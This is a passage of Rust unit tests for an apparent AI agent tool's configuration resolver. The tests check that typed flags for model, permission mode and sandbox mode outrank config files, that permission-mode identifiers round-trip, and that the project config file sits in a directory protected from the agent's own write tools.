            override_value("[\"a\", \"b\"]"),
            toml::Value::Array(vec![
                toml::Value::String("a".to_string()),
                toml::Value::String("b".to_string())
            ])
        );
    }

    /// US-008 AC1/AC2/AC5: the typed flags outrank the files, and they DO carry a
    /// security key: `--permission-mode` and `--sandbox` exist for that, and
    /// `--no-sandbox` reaches the same key as an alias of full access.
    #[test]
    fn typed_flags_carry_the_security_keys_and_outrank_the_files() {
        let dir = ConfigDir::new("flags");
        let global = dir.write(
            "settings.toml",
            "model = \"file\"\npermission_mode = \"ask\"\nsandbox_mode = \"read-only\"\n",
        );
        let overrides = vec![("model".to_string(), "from-c".to_string())];

        let config = resolve(Request {
            global: Some(&global),
            overrides: &overrides,
            flags: Flags {
                model: Some("from-flag"),
                permission_mode: Some(PermissionMode::AcceptEdits),
                sandbox_mode: Some("full-access"),
            },
            ..Request::default()
        })
        .unwrap();

        // A flag the user spelled out wins over a generic override of the same key.
        assert_eq!(config.model.as_deref(), Some("from-flag"));
        assert_eq!(config.permission_mode, Some(PermissionMode::AcceptEdits));
        assert_eq!(config.sandbox_mode.as_deref(), Some("full-access"));
        for key in [MODEL_KEY, PERMISSION_MODE_KEY, SANDBOX_MODE_KEY] {
            assert_eq!(
                config.sources.layer(key),
                Some(ConfigLayer::SessionFlags),
                "{key}"
            );
        }
    }

    /// The identifiers a refusal shows the user must be the ones the parser
    /// accepts (US-008 AC3), and they must round-trip.
    #[test]
    fn the_advertised_permission_mode_ids_round_trip() {
        for id in PERMISSION_MODE_IDS {
            let Some(mode) = permission_mode_from_arg(id) else {
                unreachable!("`{id}` annoncé mais refusé par le parseur");
            };
            assert_eq!(permission_mode_id(mode), *id);
        }
    }

    #[test]
    fn project_config_path_sits_inside_the_protected_pyxis_directory() {
        let path = project_config_path(Path::new("/ws"));
        assert_eq!(path, PathBuf::from("/ws/.pyxis/config.toml"));
        assert!(
            agent_tools::path::PROTECTED_SUBPATHS.contains(&".pyxis"),
            "le fichier de configuration de projet doit rester non écrivable par les outils"
        );
    }
}
